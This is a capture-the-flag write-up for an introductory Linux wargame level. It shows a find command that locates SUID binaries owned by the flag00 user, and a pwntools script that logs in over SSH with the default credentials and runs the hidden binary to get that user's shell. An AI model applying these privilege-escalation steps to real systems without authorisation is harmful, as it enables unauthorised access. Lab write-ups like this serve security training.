# Level 00

## Discription

>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. \
\
To access this level, log in as level00 with the password of level00.

## Solution

This challenge was pretty simple, we have to find a [SUID](https://www.linuxnix.com/suid-set-suid-linuxunix/) binary whose owner is flag00.

```sh
find / -type f -perm -4000 -user flag00 2>/dev/null
```

We got two binaries from find command. Running any of the two binaries will get you the shell of flag00 user.

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level00 = ssh(host=argv[1],user='level00',password='level00')

pro = level00.process('/bin/.../flag00')
pro.sendline('getflag')

pro.interactive()
```
